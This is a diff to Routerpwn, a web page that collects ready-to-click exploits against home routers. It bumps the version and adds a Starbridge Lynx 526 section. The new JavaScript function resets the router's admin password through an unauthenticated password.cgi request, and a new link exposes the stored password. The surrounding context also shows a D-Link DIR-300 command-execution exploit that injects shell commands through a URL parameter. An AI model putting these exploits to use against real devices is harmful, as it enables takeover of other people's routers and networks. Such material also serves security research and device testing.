@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.21.241</title>
+		<title>Routerpwn 1.21.243</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link rel="shortcut icon" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -90,7 +90,7 @@ column-count:4;
 		border-style: solid;
 	}
 
-	#alpha,#ruggedcom,#freebox,#seagate,#sitecom,#wire,#com,#arris,#asmax,#asus,#alcatellucent,#belkin,#cisco, #cobham, #comtrend,#DDWRT,#DLink,#zoom,#smc,#Easybox,#fibrehome,#huawei,#mifi,#motorola,#netgear,#pirelli,#sagem,#siemens,#thomson,#tplink,#trendnet,#ubiquiti,#utstarcom,#xavi,#zyxel, #ubee, #zte, #EE, #DD-WRT, #unicorn, #binatone {
+	#alpha,#ruggedcom,#freebox,#seagate,#sitecom,#wire,#com,#arris,#asmax,#asus,#alcatellucent,#belkin,#cisco, #cobham, #comtrend,#DDWRT,#DLink,#zoom,#smc,#Easybox,#fibrehome,#huawei,#mifi,#motorola,#netgear,#pirelli,#sagem,#siemens,#thomson,#tplink,#trendnet,#ubiquiti,#utstarcom,#xavi,#zyxel, #ubee, #zte, #EE, #DD-WRT, #unicorn, #binatone, #starbridge {
 		background-image: url("bg.jpg");
 	}
 
@@ -388,6 +388,15 @@ function dir300615_commandexec(ip)
 	ip = ip || "192.168.178.155";
 	cmd = prompt("Command:");
 	url = "/tools_system.xgi?random_num=2012.8.24.13.34.33&exeshell=submit%20`" + encodeURI(cmd) + "`";
+	document.location="http://"+ip+url;
+}
+
+// Starbridge Lynx 526 - Password Reset
+function lynx526_passwordreset(ip)
+{
+	ip = ip || "192.168.1.1";
+	password = prompt("New Password:");
+	url = "/password.cgi?sysPassword=" + password;
 	document.location="http://"+ip+url;
 }
 
@@ -2541,6 +2550,7 @@ function belkinwpspin()
 			<div><h2><a href="#siemens">Siemens</a></h2></div>
 			<div><h2><a href="#sitecom">Sitecom</a></h2></div>
 			<div><h2><a href="#smc">SMC</a></h2></div>
+			<div><h2><a href="#starbridge">Starbridge</a></h2></div>
 			<div><h2><a href="#thomson">Thomson</a></h2></div>
 			<div><h2><a href="#tplink">TP-Link</a></h2></div>
 			<div><h2><a href="#trendnet">TRENDnet</a></h2></div>
@@ -4251,7 +4261,7 @@ function belkinwpspin()
 <article>
 	<div>03/30/09</div>
 	<div><a href="http://www.exploit-db.com/exploits/8316/">[+]</a></div>
-	<div><a href="javascript:isnser()">FlexiISN auth bypass Network Access & services</a></div>
+	<div><a href="javascript:isnser()">FlexiISN auth bypass Network Access &amp; services</a></div>
 	<div><a href="javascript:isnser()">[SET IP]</a></div>
 </article>
 	
@@ -4307,6 +4317,25 @@ function belkinwpspin()
 	<div><a href="http://192.168.1.1/wan.stm">SMCWBR14-G2 PPPoE Data Disclosure (ADSL Router)</a></div>
 	<div><a href="javascript:setip('/wan.stm');">[SET IP]</a></div>
 </article>
+<div style="float: right"><a href="#">^ Top</a></div>
+</section><br><br>
+<section id="starbridge">
+<h2>Starbridge</h2>
+<h3><a href="javascript:img('Lynx 526')">Lynx 526</a></h3>
+<article>
+	<div>09/09/14</div>
+	<div><a href="https://github.com/hkm/routerpwn.com/issues/54">[+]</a></div>
+	<div><a href="javascript:lynx526_passwordreset();">Starbridge Lynx 526 - Password Reset</a></div>
+	<div><a href="javascript:lynx526_passwordreset(ip);" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>09/09/14</div>
+	<div><a href="https://github.com/hkm/routerpwn.com/issues/54">[+]</a></div>
+	<div><a href="http://192.168.1.1/password.cgi">Starbridge Lynx 526 - Password Disclosure</a></div>
+	<div><a href="javascript:setip('/password.cgi');">[SET IP]</a></div>
+</article>
+
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="thomson">
 <form name='thomsonadmin' action='http://192.168.1.254/cgi/b/users/cfg/usraccedit/?be=0&amp;l0=2&amp;l1=9' method='post'>
